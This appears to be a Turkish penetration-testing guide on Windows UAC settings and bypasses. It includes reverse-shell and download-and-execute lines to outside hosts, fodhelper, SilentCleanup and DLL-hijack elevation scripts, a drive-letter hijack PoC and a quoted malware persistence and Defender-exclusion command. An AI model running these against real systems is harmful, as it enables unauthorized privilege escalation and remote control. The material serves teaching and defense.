# UAC - User Account Control

{{#include ../../banners/hacktricks-training.md}}

## UAC

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works), **yükseltilmiş etkinlikler için bir onay istemi** sağlayan bir özelliktir. Uygulamaların farklı `integrity` seviyeleri vardır ve **yüksek seviyeye** sahip bir program, **potansiyel olarak sistemi tehlikeye atabilecek görevleri** gerçekleştirebilir. UAC etkinleştirildiğinde, bir yönetici uygulamaların/görevlerin sistem üzerinde yönetici seviyesinde erişimle çalışmasına açıkça izin vermediği sürece, uygulamalar ve görevler her zaman **yönetici olmayan bir hesabın güvenlik bağlamında çalışır**. Bu, yöneticileri istenmeyen değişikliklerden koruyan bir kolaylık özelliğidir; ancak bir security boundary olarak kabul edilmez.<sup>[[2]](#references)</sup>

integrity seviyeleri hakkında daha fazla bilgi için:


{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

UAC devredeyken, bir yönetici kullanıcıya 2 token verilir: normal işlemleri medium integrity seviyesinde gerçekleştirmek için standart kullanıcı token'ı ve admin ayrıcalıklarına sahip bir token.

Bu [sayfa](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works), logon süreci, kullanıcı deneyimi ve UAC architecture dahil olmak üzere UAC'nin nasıl çalıştığını ayrıntılı şekilde açıklar.<sup>[[2]](#references)</sup> Yöneticiler, UAC'nin kuruluşlarına özgü çalışma şeklini local seviyede (secpol.msc kullanarak) security policy'ler aracılığıyla yapılandırabilir veya Active Directory domain ortamında Group Policy Objects (GPO) üzerinden yapılandırıp dağıtabilir. Çeşitli ayarlar [burada](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings) ayrıntılı olarak açıklanmıştır. UAC için ayarlanabilen 10 Group Policy ayarı vardır. Aşağıdaki tablo ek bilgiler sunar:

| Group Policy Setting                                                                                                                                                                                                                                                                                                                                                           | Registry Key                | Default Setting                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [User Account Control: Yerleşik Administrator hesabı için Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                                                                           | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`   | `0` (Devre dışı)                                             |
| [User Account Control: Admin Approval Mode'daki yöneticiler için elevation prompt davranışı](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` | `5` (Güvenli masaüstünde Windows dışı binary'ler için onay iste) |
| [User Account Control: Standart kullanıcılar için elevation prompt davranışı](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorUser`  | `1` (Güvenli masaüstünde credential iste)         |
| [User Account Control: Uygulama kurulumlarını algıla ve elevation iste](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                                                                 | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableInstallerDetection`   | `1` (Etkin; Enterprise'da varsayılan olarak devre dışı)           |
| [User Account Control: Yalnızca imzalanmış ve doğrulanmış executable'ları elevate et](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ValidateAdminCodeSignatures` | `0` (Devre dışı)                                             |
| [User Account Control: Yalnızca güvenli konumlara kurulmuş UIAccess uygulamalarını elevate et](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableSecureUIAPaths`       | `1` (Etkin)                                              |
| [User Account Control: Tüm yöneticileri Admin Approval Mode'da çalıştır](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                                                                            | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA`                  | `1` (Etkin)                                              |
| [User Account Control: UIAccess uygulamalarının secure desktop kullanmadan elevation istemesine izin ver](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop)                                   | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableUIADesktopToggle`     | `0` (Devre dışı)                                             |
| [User Account Control: Elevation istenirken secure desktop'a geç](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                                               | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\PromptOnSecureDesktop`      | `1` (Etkin)                                              |
| [User Account Control: Dosya ve registry write hatalarını kullanıcıya özel konumlara virtualize et](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableVirtualization`       | `1` (Etkin)                                              |

### Windows'ta software kurulumuna yönelik policy'ler

**local security policy'ler** (çoğu sistemde "secpol.msc"), varsayılan olarak **admin olmayan kullanıcıların software kurulumu gerçekleştirmesini önleyecek** şekilde yapılandırılır. Bu, admin olmayan bir kullanıcı software'iniz için installer'ı indirebilse bile admin hesabı olmadan çalıştıramayacağı anlamına gelir.

### UAC'nin Elevation İstemesini Zorlamak için Registry Key'ler

Admin hakları olmayan standart bir kullanıcı olarak, "standart" hesabın belirli işlemleri gerçekleştirmeye çalıştığında **UAC tarafından credential istenmesini** sağlayabilirsiniz. Bu işlem, belirli **registry key'lerinin** değiştirilmesini gerektirir; bu key'ler için admin izinlerine ihtiyacınız vardır; ancak bir **UAC bypass** varsa veya saldırgan zaten admin olarak logon olmuşsa bu durum geçerli değildir.

Kullanıcı **Administrators** grubunda olsa bile bu değişiklikler, administrative işlemleri gerçekleştirebilmesi için kullanıcının **hesap credential'larını yeniden girmesini** zorunlu kılar.

**Pratikte bu yalnızca zaten elevated bir token'a, bir UAC bypass'a veya bu key'leri değiştirmenize izin veren bir misconfiguration'a sahip olduğunuzda kullanışlıdır; aksi takdirde registry write işleminin kendisi engellenir.**

Değiştirmeniz gereken registry key'leri ve entry'ler (varsayılan değerleri parantez içinde) şunlardır:

- `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`:
- `ConsentPromptBehaviorUser` = 1 (3)
- `ConsentPromptBehaviorAdmin` = 1 (5)
- `PromptOnSecureDesktop` = 1 (1)

Bu işlem Local Security Policy aracı üzerinden manuel olarak da yapılabilir. Değiştirildikten sonra administrative işlemler, kullanıcının credential'larını yeniden girmesini ister.

### Note

**User Account Control bir security boundary değildir.** Bu nedenle standart kullanıcılar, local privilege escalation exploit'i olmadan hesaplarından çıkıp admin hakları elde edemez.

### Bir kullanıcıdan 'full computer access' isteme
```powershell
hostname | Set-Clipboard
Enable-PSRemoting -SkipNetworkProfileCheck -Force

cd C:\Users\hacedorderanas\Desktop
New-PSSession -Name "Case ID: 1527846" -ComputerName hostname
Enter-PSSession -ComputerName hostname
```
### UAC Privileges

- Internet Explorer Protected Mode, yüksek bütünlük düzeyine sahip işlemlerin (web tarayıcıları gibi) düşük bütünlük düzeyine sahip verilere (geçici Internet dosyaları klasörü gibi) erişmesini önlemek için bütünlük denetimlerini kullanır. Bu işlem, tarayıcının düşük bütünlük belirtecine sahip olarak çalıştırılmasıyla gerçekleştirilir. Tarayıcı, düşük bütünlük bölgesinde depolanan verilere erişmeye çalıştığında işletim sistemi işlemin bütünlük düzeyini denetler ve erişime buna göre izin verir. Bu özellik, remote code execution saldırılarının sistemdeki hassas verilere erişmesini önlemeye yardımcı olur.
- Bir kullanıcı Windows'ta oturum açtığında sistem, kullanıcının ayrıcalıklarının listesini içeren bir erişim belirteci oluşturur. Ayrıcalıklar, kullanıcının hakları ve yeteneklerinin birleşimi olarak tanımlanır. Belirteç ayrıca kullanıcının kimlik bilgileri listesini de içerir; bunlar kullanıcının bilgisayarda ve ağ üzerindeki kaynaklarda kimliğini doğrulamak için kullanılan kimlik bilgileridir.

### Autoadminlogon

Windows'u başlangıçta belirli bir kullanıcıyla otomatik olarak oturum açacak şekilde yapılandırmak için **`AutoAdminLogon` registry key** değerini ayarlayın. Bu, kiosk ortamları veya test amaçları için kullanışlıdır. Parolayı registry içinde açığa çıkardığından bunu yalnızca güvenli sistemlerde kullanın.

Aşağıdaki anahtarları Registry Editor veya `reg add` kullanarak ayarlayın:

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`:
- `AutoAdminLogon` = 1
- `DefaultUsername` = username
- `DefaultPassword` = password

Normal oturum açma davranışına dönmek için `AutoAdminLogon` değerini 0 olarak ayarlayın.

## UAC bypass

> [!TIP]
> Mağdur sisteme grafiksel erişiminiz varsa UAC bypass işleminin basit olduğunu unutmayın; UAC istemi göründüğünde "Yes" seçeneğine tıklamanız yeterlidir.

UAC bypass işlemi şu durumda gereklidir: **UAC etkin, işleminiz medium integrity bağlamında çalışıyor ve kullanıcınız administrators grubuna ait.**

UAC en yüksek güvenlik düzeyindeyse (Always), diğer düzeylerden birindekine (Default) kıyasla **bypass edilmesinin çok daha zor** olduğunu belirtmek önemlidir.

### Medium-integrity shell'den hızlı triage

Bir bypass denemeden önce doğru senaryoda olduğunuzu doğrulayın ve host build'ini bilinen şekilde çalışan yöntemlerle eşleştirin:
```powershell
whoami /groups
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v PromptOnSecureDesktop
powershell -c "Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion' | select ProductName,DisplayVersion,CurrentBuild,UBR"
schtasks /Query /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
```
Pratik notlar:
- `EnableLUA=0` ise bypass kullanmanız gerekmez: herhangi bir admin token doğrudan high integrity talep edebilir.
- `ConsentPromptBehaviorAdmin=2` veya `5`, auto-elevate / COM-based bypasses için yaygın senaryodur.
- `Always Notify` güvenlik çıtasını yükseltir, ancak başarısız olduğunu varsaymak yerine tam build'i yine de test etmelisiniz: UACME, modern Windows build'lerinde hâlâ bazı `AlwaysNotify compatible` yöntemleri takip etmektedir.<sup>[[3]](#references)</sup>

### UAC devre dışı

UAC zaten devre dışıysa (`ConsentPromptBehaviorAdmin` **`0`**), aşağıdakine benzer bir yöntem kullanarak **admin privileges ile bir reverse shell çalıştırabilirsiniz** (high integrity level):
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### UAC bypass with token duplication

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **Çok** Basic UAC "bypass" (dosya sistemine tam erişim)

Administrators grubunun içinde bulunan bir kullanıcıyla bir shell'iniz varsa, SMB (dosya sistemi) üzerinden paylaşılan **C$**'ı yeni bir diske local olarak **mount** edebilir ve **dosya sisteminin içindeki her şeye erişim** elde edebilirsiniz (Administrator home folder'ı dahi).

> [!WARNING]
> **Görünüşe göre bu trick artık çalışmıyor**
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### Cobalt Strike ile UAC bypass

Cobalt Strike teknikleri yalnızca UAC maksimum güvenlik seviyesine ayarlanmadıysa çalışır
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** ve **Metasploit**, **UAC**'yi **bypass** etmek için çeşitli modüllere de sahiptir.

### Yükseltilmiş COM arayüzleri (`ICMLuaUtil` / `CMSTPLUA`)

Auto-elevated COM nesneleri, modern build'lerde pratik bir UAC saldırı yüzeyi olmaya devam ediyor. `ICMLuaUtil`, UACME tarafından güncel Windows dallarında hâlâ çalışan bir yöntem olarak izleniyor ve offensive tooling, COM Elevation Moniker'ı çağırmadan önce etkileşimli bir desktop process, 64-bit execution ve bazen PEB/process masquerading yöntemlerini birleştirerek `CMSTPLUA`'yı uyarlamaya devam ediyor.<sup>[[3]](#references)</sup>

Pratik ipuçları:
- Kullanıcının **interactive session**'ında (genellikle `explorer.exe` veya onun bir child process'i) bir **64-bit** process tercih edin.
- Ham bir shell başarısız olursa, naif bir `CreateProcess` wrapper'ı yerine bir BOF / UACME implementation ile yeniden deneyin.
- Child execution'ın **ayrı bir elevated process** içinde gerçekleşmesini bekleyin; birçok BOF mevcut beacon'ı yerinde elevate etmez.

### KRBUACBypass

Dokümantasyon ve tool: [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### UAC bypass exploit'leri

[**UACME**](https://github.com/hfiref0x/UACME), UAC bypass tekniklerinden oluşan bir koleksiyondur. Visual Studio veya MSBuild ile compile edin; build, birkaç executable oluşturur (örneğin, `Source\Akagi\output\x64\Debug\Akagi.exe`), bu nedenle hedef build'e uygun yöntemi seçin.<sup>[[3]](#references)</sup>\
Dikkatli olun: bazı bypass'lar, kullanıcıyı uyarabilecek görünür programlar veya prompt'lar başlatır.<sup>[[3]](#references)</sup>

UACME, her tekniğin çalışmaya başladığı **build version** bilgisini içerir.<sup>[[3]](#references)</sup> Sürümlerinizi etkileyen bir tekniği arayabilirsiniz:
```powershell
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
Ayrıca, [bu](https://en.wikipedia.org/wiki/Windows_10_version_history) sayfayı kullanarak build sürümlerinden Windows release `1607` değerini elde edebilirsiniz.

Uygulanabilir bir iş akışı, önce **host build** değerini puanlamak ve yalnızca ardından eşleşen yöntemi çalıştırmaktır:
```cmd
python main.py --scan uac
Akagi64.exe 33 C:\Windows\System32\cmd.exe
```
- `WinPwnage`, yerel build'i bilinen UAC yöntemleriyle hızlıca karşılaştırır; bu, geçersiz PoC'leri hızla elemek için kullanışlıdır.<sup>[[4]](#references)</sup>
- `UACME`, bir bypass yöntemini belirli bir build ile eşleştirmek için hâlâ en iyi public katalogdur. Güncel sürümler yeni yöntemler ekledi ve mevcut yöntemleri **Windows 11 25H2** üzerinde yeniden test etti; bu nedenle eski bir blog gönderisinin hâlâ değişiklik yapılmadan geçerli olduğunu varsaymadan önce README'yi ve release notes'u yeniden kontrol edin.<sup>[[3]](#references)</sup>

### UAC Bypass – fodhelper.exe (Registry hijack)

Güvenilir binary `fodhelper.exe`, modern Windows'ta auto-elevated durumdadır. Çalıştırıldığında, `DelegateExecute` verb'ünü doğrulamadan aşağıdaki per-user registry path'ini sorgular. Buraya bir command yerleştirmek, Administrators grubundaki bir kullanıcının Medium Integrity process'inin UAC prompt'u olmadan High Integrity process başlatmasını sağlar.

Registry path queried by fodhelper:
```text
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
<details>
<summary>PowerShell adımları (payload'unuzu ayarlayın, ardından tetikleyin)</summary>
```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```
</details>
Notlar:
- Geçerli kullanıcı Administrators üyesi olduğunda ve UAC seviyesi varsayılan/gevşek olduğunda çalışır (ek kısıtlamalarla Always Notify değil).
- 64-bit Windows üzerinde 32-bit bir işlemden 64-bit PowerShell başlatmak için `sysnative` yolunu kullanın.
- Payload herhangi bir komut olabilir (PowerShell, cmd veya bir EXE yolu). Stealth için kullanıcı arayüzü istemlerinden kaçının.

#### CurVer/extension hijack varyantı (yalnızca HKCU)

`fodhelper.exe` dosyasını abuse eden güncel örnekler `DelegateExecute` değerinden kaçınır ve bunun yerine per-user `CurVer` değeri üzerinden **`ms-settings` ProgID'sini yönlendirir**. Auto-elevated binary, handler'ı hâlâ `HKCU` altında çözümler; bu nedenle anahtarları yerleştirmek için admin token gerekmez:<sup>[[5]](#references)</sup>
```powershell
# Point ms-settings to a custom extension (.thm) and map that extension to our payload
New-Item -Path "HKCU:\Software\Classes\.thm\Shell\Open" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\.thm\Shell\Open\command" -Name "(default)" -Value "C:\\ProgramData\\rKXujm.exe" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings" -Name "CurVer" -Value ".thm" -Force

Start-Process "C:\\Windows\\System32\\fodhelper.exe"   # auto-elevates and runs rKXujm.exe
```
Yetkiler yükseltildikten sonra malware genellikle `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` değerini `0` olarak ayarlayarak **gelecekteki istemleri devre dışı bırakır**; ardından ek defense evasion işlemleri gerçekleştirir (ör. `Add-MpPreference -ExclusionPath C:\ProgramData`) ve high integrity olarak çalışmak için persistence'ı yeniden oluşturur. Tipik bir persistence görevi, diskte **XOR ile şifrelenmiş bir PowerShell scripti** depolar ve bunu her saat bellekte decode edip çalıştırır:<sup>[[5]](#references)</sup>
```powershell
schtasks /create /sc hourly /tn "OneDrive Startup Task" /rl highest /tr "cmd /c powershell -w hidden $d=[IO.File]::ReadAllBytes('C:\ProgramData\VljE\zVJs.ps1');$k=[Text.Encoding]::UTF8.GetBytes('Q');for($i=0;$i -lt $d.Length;$i++){$d[$i]=$d[$i]-bxor$k[$i%$k.Length]};iex ([Text.Encoding]::UTF8.GetString($d))"
```
Bu varyant yine dropper'ı temizler ve yalnızca staged payloads bırakır; bu nedenle detection, **`CurVer` hijack**, `ConsentPromptBehaviorAdmin` tampering, Defender exclusion oluşturulması veya PowerShell'i bellekte decrypt eden scheduled tasks'in izlenmesine dayanır.<sup>[[5]](#references)</sup>

### `SilentCleanup` task ile UAC bypass (`HKCU\Environment\windir`)

`SilentCleanup`, `cleanmgr.exe`'yi en yüksek ayrıcalıklarla başlatır ve `%windir%` değerini kullanıcı ortamından genişletir. `HKCU\Environment\windir` değerini kontrol ediyorsanız bu genişletmeyi arbitrary bir komuta yönlendirebilir ve bir consent dialog olmadan high integrity elde edebilirsiniz.<sup>[[8]](#references)</sup> UACME tekniği aktif tutmaya devam ettiği ve güncel issue tracking, Windows 11 24H2'nin yalnızca küçük quoting adjustments gerektirebileceğini gösterdiği için bu yöntem recent build'lerde hâlâ test edilmeye değerdir.<sup>[[3]](#references)</sup>
```cmd
reg add "HKCU\Environment" /v windir /d "cmd.exe /c start powershell.exe" /f
schtasks /Run /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
reg delete "HKCU\Environment" /v windir /f
```
Bu build'de görev yolu tırnak içine alıyorsa payload'ı tırnakla bitecek şekilde yeniden deneyin (örneğin `cmd.exe"`). Test ettikten sonra `HKCU\Environment\windir` değerini her zaman temizleyin.

#### More UAC bypass

UI akışlarını, COM nesnelerini veya desktop etkileşimini kötüye kullanan birçok klasik UAC bypass yöntemi, kurbanda **tam etkileşimli bir oturum** gerektirir; yaygın bir `nc.exe` shell'i veya **Session 0** içinde çalışan bir servis çoğu zaman yeterli değildir.

Bunu genellikle bir **meterpreter** oturumu kullanarak çözebilirsiniz. **Session** değeri **1** olan bir **process**'e migrate edin:

![ms-settings'i özel bir uzantıya (.thm) yönlendirin ve bu uzantıyı payload'ınıza eşleyin - More UAC bypass: Bunu bir meterpreter oturumu kullanarak elde edebilirsiniz. Session değerine sahip bir process'e migrate edin...](<../../images/image (863).png>)

(_explorer.exe_ çalışmalıdır)

### UAC Bypass with GUI

Bir **GUI** erişiminiz varsa, UAC prompt'u göründüğünde **onaylayabilirsiniz**; aslında teknik bir bypass yöntemine ihtiyacınız yoktur. Bu nedenle bir GUI oturumu elde etmek, UAC'nin eklediği pratik engeli aşmak için çoğu zaman yeterlidir.

Ayrıca birinin kullandığı bir GUI oturumu elde ederseniz (potansiyel olarak RDP üzerinden), buradan **doğrudan admin olarak** örneğin bir **cmd** **çalıştırabileceğiniz**, **administrator olarak çalışıyor** olacak bazı araçlar bulunabilir; böylece UAC tarafından tekrar prompt gösterilmez. Örneğin [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Bu biraz daha **stealthy** olabilir.

### Noisy brute-force UAC bypass

Gürültü kabul edilebilirse [**ForceAdmin**](https://github.com/Chainski/ForceAdmin) gibi bir araç, kullanıcı kabul edene kadar tekrar tekrar elevation isteyebilir.

### Your own bypass - Basic UAC bypass methodology

**UACME**'ye bakarsanız, **birçok UAC bypass yönteminin DLL hijacking'i kötüye kullandığını** fark edersiniz (çoğunlukla elevated bir binary'ye, writable bir path'ten saldırganın kontrolündeki bir DLL'i yükleterek). [Bir DLL hijacking zafiyetini nasıl bulacağınızı öğrenmek için bunu okuyun](../windows-local-privilege-escalation/dll-hijacking/index.html).

1. **autoelevate** olacak bir binary bulun (çalıştırıldığında high integrity level'da çalıştığını kontrol edin).
2. Procmon ile **DLL Hijacking**'e karşı savunmasız olabilecek "**NAME NOT FOUND**" event'lerini bulun.
3. DLL'i bazı **protected path**'lerin (C:\Windows\System32 gibi) içine **yazmanız** gerekebilir; bu path'lerde yazma izniniz yoktur. Bunu şu yöntemlerle aşabilirsiniz:
1. **wusa.exe**: Windows 7,8 ve 8.1. Bu araç high integrity level'dan çalıştırıldığı için bir CAB dosyasının içeriğini protected path'lerin içine çıkarmanıza olanak tanır.
2. **IFileOperation**: Windows 10.
4. DLL'inizi protected path'in içine kopyalayacak ve savunmasız, autoelevated binary'yi çalıştıracak bir **script** hazırlayın.

### Another UAC bypass technique

Bir **autoElevated binary**'nin çalıştırılacak bir **binary** veya **command**'in **name/path** bilgisini **registry**'den **okumaya** çalışıp çalışmadığını izlemekten oluşur (binary bu bilgiyi **HKCU** içinde arıyorsa daha ilgi çekicidir).

### UAC bypass via `SysWOW64\iscsicpl.exe` + user `PATH` DLL hijack

32-bit `C:\Windows\SysWOW64\iscsicpl.exe`, arama sırasını kullanarak `iscsiexe.dll` yüklemesi için kötüye kullanılabilecek bir **auto-elevated** binary'dir. Kötü amaçlı bir `iscsiexe.dll` dosyasını **user-writable** bir klasöre yerleştirebilir ve ardından mevcut kullanıcının `PATH`'ini (örneğin `HKCU\Environment\Path` üzerinden), bu klasör aranacak şekilde değiştirebilirseniz Windows, UAC prompt'u göstermeden saldırgan DLL'ini elevated `iscsicpl.exe` process'inin içine yükleyebilir.<sup>[[1]](#references)[[6]](#references)</sup>

Pratik notlar:
- Bu, mevcut kullanıcının **Administrators** grubunda olup UAC nedeniyle **Medium Integrity** seviyesinde çalıştığı durumlarda kullanışlıdır.
- Bu bypass için **SysWOW64** kopyası önemlidir. **System32** kopyasını ayrı bir binary olarak değerlendirin ve davranışını bağımsız şekilde doğrulayın.
- Primitive, **auto-elevation** ile **DLL search-order hijacking** birleşiminden oluşur; bu nedenle diğer UAC bypass yöntemlerinde kullanılan ProcMon workflow'u, eksik DLL yüklemesini doğrulamak için faydalıdır.

Minimal akış:
```cmd
copy iscsiexe.dll %TEMP%\iscsiexe.dll
reg add "HKCU\Environment" /v Path /t REG_SZ /d "%TEMP%" /f
C:\Windows\System32\cmd.exe /c C:\Windows\SysWOW64\iscsicpl.exe
```
Tespit fikirleri:
- `reg add` / registry writes işlemlerini `HKCU\Environment\Path` konumuna ve hemen ardından `C:\Windows\SysWOW64\iscsicpl.exe` çalıştırılmasına karşı alert oluşturun.
- `%TEMP%` veya `%LOCALAPPDATA%\Microsoft\WindowsApps` gibi **user-controlled** konumlarda `iscsiexe.dll` arayın.
- `iscsicpl.exe` başlatmalarını, beklenmeyen child process'ler veya normal Windows dizinlerinin dışından yapılan DLL yüklemeleriyle ilişkilendirin.

### Ayrı olarak incelenmeye değer daha yeni araştırmalar

2024 sonrası bazı chain'ler artık klasik `HKCU\Software\Classes` registry hijack'lerine benzemiyor. Örneğin activation-context cache poisoning, **drive remap** ve **DLL redirection** işlemlerini birleştirerek `ctfmon.exe` ve daha sonra `fodhelper.exe` gibi trusted UI / auto-elevated binary'ler üzerinden medium integrity'den high integrity'ye geçiş sağlayabilir. Büyük PoC'yi burada tekrarlamak yerine şu konumdaki compact payload örneklerini inceleyin:

{{#ref}}
../windows-local-privilege-escalation/windows-c-payloads.md
{{#endref}}

### Administrator Protection (25H2) per-logon-session DOS device map üzerinden drive-letter hijack

Windows 11 25H2 üzerindeki kapsamlı `RAiLaunchAdminProcess` / UIAccess attack surface için özel sayfayı inceleyin:

{{#ref}}
../windows-local-privilege-escalation/uiaccess-admin-protection-bypass.md
{{#endref}}

Windows 11 25H2 “Administrator Protection”, per-session `\Sessions\0\DosDevices/<LUID>` map'lerine sahip shadow-admin token'ları kullanır. Directory, ilk `\??` resolution işleminde `SeGetTokenDeviceMap` tarafından lazy olarak oluşturulur. Saldırgan shadow-admin token'ını yalnızca **SecurityIdentification** seviyesinde impersonate ederse directory, saldırgan **owner** olacak şekilde oluşturulur (`CREATOR OWNER` miras alınır); bu da `\GLOBAL??` önceliğine sahip drive-letter link'lerine izin verir.<sup>[[7]](#references)</sup>

**Adımlar:**

1. Düşük yetkili bir session'dan, promptless bir shadow-admin `runonce.exe` başlatmak için `RAiProcessRunOnce` çağırın.
2. Primary token'ını bir **identification** token'ına duplicate edin ve `\??` açılırken impersonate ederek `\Sessions\0\DosDevices/<LUID>` konumunun attacker ownership altında oluşturulmasını zorlayın.
3. Burada attacker-controlled storage'a işaret eden bir `C:` symlink oluşturun; bu session'daki sonraki filesystem access işlemleri `C:` konumunu attacker path'ine resolve ederek prompt olmadan DLL/file hijack yapılmasını sağlar.

**PowerShell PoC (NtObjectManager):**
```powershell
$pid = Invoke-RAiProcessRunOnce
$p = Get-Process -Id $pid
$t = Get-NtToken -Process $p
$id = New-NtTokenDuplicate -Token $t -ImpersonationLevel Identification
Invoke-NtToken $id -ImpersonationLevel Identification { Get-NtDirectory "\??" | Out-Null }
$auth = Get-NtTokenId -Authentication -Token $id
New-NtSymbolicLink "\Sessions\0\DosDevices/$auth/C:" "\??\\C:\\Users\\attacker\\loot"
```
## References

- [1] [LOLBAS: Iscsicpl.exe](https://lolbas-project.github.io/lolbas/Binaries/Iscsicpl/)
- [2] [Microsoft Docs – Kullanıcı Hesabı Denetimi nasıl çalışır](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [3] [UACME – UAC bypass teknikleri koleksiyonu](https://github.com/hfiref0x/UACME)
- [4] [WinPwnage – UAC bypass uyumluluk tarayıcısı ve başlatıcısı](https://github.com/rootm0s/WinPwnage)
- [5] [Checkpoint Research – KONNI, PowerShell Backdoor'ları oluşturmak için AI kullanıyor](https://research.checkpoint.com/2026/konni-targets-developers-with-ai-malware/)
